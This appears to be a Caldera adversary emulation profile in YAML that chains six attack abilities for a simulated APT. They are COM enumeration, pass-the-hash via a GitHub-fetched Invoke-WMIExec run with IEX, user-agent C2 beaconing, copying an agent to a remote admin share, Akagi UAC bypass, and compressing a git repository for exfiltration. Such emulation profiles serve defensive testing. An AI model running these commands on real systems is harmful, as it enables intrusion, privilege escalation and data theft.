adversary_id: custom_adversary_profile__None__Survey_Paper_APT_Attack_Six_Phases__2023-10-19-22_43_13
name: Custom Adversary Profile
description: [['atomic__reconnaissance'], ['atomic__initial_access'], ['stockpile__command-and-control', 'atomic__command-and-control'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__exfiltration', 'atomic__exfiltration']]
atomic_ordering:
- afe32d76ebb32d20d0b43707bf271beb # ('afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me') ; {'description': 'This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects', 'tactic': 'reconnaissance', 'technique': {'attack_id': 'T1592.002', 'name': 'Gather Victim Host Information: Software'}, 'platforms': {'windows': {'psh': {'cleanup': 'remove-item $env:temp\\T1592.002Test1.txt -force -erroraction silentlycontinue; remove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue', 'command': 'New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content "$env:temp\\clsids.txt"); {try{write-output "$($Position)-$($CLSID)"; write-output "------------"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me'], 'plugin': 'atomic'}
- 8ce073cf3170576e1f5c6e4d06e1873a # ('8ce073cf3170576e1f5c6e4d06e1873a', 'None', 'validate_me') ; {'description': 'Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)', 'tactic': 'multiple', 'technique': {'attack_id': 'T1550.002', 'name': 'Use Alternate Authentication Material: Pass the Hash'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname", 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['8ce073cf3170576e1f5c6e4d06e1873a', 'None', 'validate_me'], 'plugin': 'atomic'}
- 24c3b7b004401d839a5c337201da3484 # ('24c3b7b004401d839a5c337201da3484', 'None', 'None') ; {'description': 'This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n', 'tactic': 'command-and-control', 'technique': {'attack_id': 'T1071.001', 'name': 'Application Layer Protocol: Web Protocols'}, 'platforms': {'windows': {'cmd': {'cleanup': '', 'command': 'C:\\Windows\\System32\\Curl.exe -s -A "HttpBrowser/1.0" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com >nul 2>&1 && C:\\Windows\\System32\\Curl.exe -s -A "*<|>*" -m3 www.google.com >nul 2>&1', 'payloads': []}}}, 'id__dependence__fact': ['24c3b7b004401d839a5c337201da3484', 'None', 'None'], 'plugin': 'atomic'}
- 65048ec1-f7ca-49d3-9410-10813e472b30 # ('65048ec1-f7ca-49d3-9410-10813e472b30', 'remote.host.fqdn', 'remote.host.fqdn') ; {'description': 'Copy 54ndc47 to remote host (SMB)', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}, 'platforms': {'windows': {'psh': {'command': '$path = "sandcat.go-windows";\n$drive = "\\\\#{remote.host.fqdn}\\C$";\nCopy-Item -v -Path $path -Destination $drive"\\Users\\Public\\s4ndc4t.exe";\n', 'cleanup': '$drive = "\\\\#{remote.host.fqdn}\\C$";\nRemove-Item -Path $drive"\\Users\\Public\\s4ndc4t.exe" -Force;\n', 'parsers': {'plugins.stockpile.app.parsers.54ndc47_remote_copy': [{'source': 'remote.host.fqdn', 'edge': 'has_54ndc47_copy'}]}, 'payloads': ['sandcat.go-windows']}}}, 'id__dependence__fact': ['65048ec1-f7ca-49d3-9410-10813e472b30', 'remote.host.fqdn', 'remote.host.fqdn'], 'plugin': 'stockpile'}
- 95ad5d69-563e-477b-802b-4855bfb3be09 # ('95ad5d69-563e-477b-802b-4855bfb3be09', 'None', 'None') ; {'description': 'Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe', 'tactic': 'privilege-escalation', 'technique': {'attack_id': 'T1548.002', 'name': 'Abuse Elevation Control Mechanism: Bypass User Access Control'}, 'platforms': {'windows': {'cmd,psh': {'command': '.\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n', 'payloads': ['Akagi64.exe']}}}, 'id__dependence__fact': ['95ad5d69-563e-477b-802b-4855bfb3be09', 'None', 'None'], 'plugin': 'stockpile'}
- 2f90d4de-2612-4468-9251-b220e3727452 # ('2f90d4de-2612-4468-9251-b220e3727452', 'None', 'host.dir.compress') ; {'description': 'This ability will compress a given git repository.', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1560.001', 'name': 'Archive Collected Data: Archive via Utility'}, 'platforms': {'linux': {'sh': {'command': 'tar -czf #{host.dir.git}.tar.gz -C "#{host.dir.git}" .; printf #{host.dir.git}.tar.gz;\n', 'cleanup': 'rm #{host.dir.git}.tar.gz;\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.compress'}]}}}, 'windows': {'psh': {'command': 'tar -czf #{host.dir.git}.tar.gz -C #{host.dir.git} *; Write-Host #{host.dir.git}.tar.gz; exit 0;\n', 'cleanup': 'Remove-Item -Path #{host.dir.git}.tar.gz;\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.dir.compress'}]}}}}, 'id__dependence__fact': ['2f90d4de-2612-4468-9251-b220e3727452', 'None', 'host.dir.compress'], 'plugin': 'stockpile'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []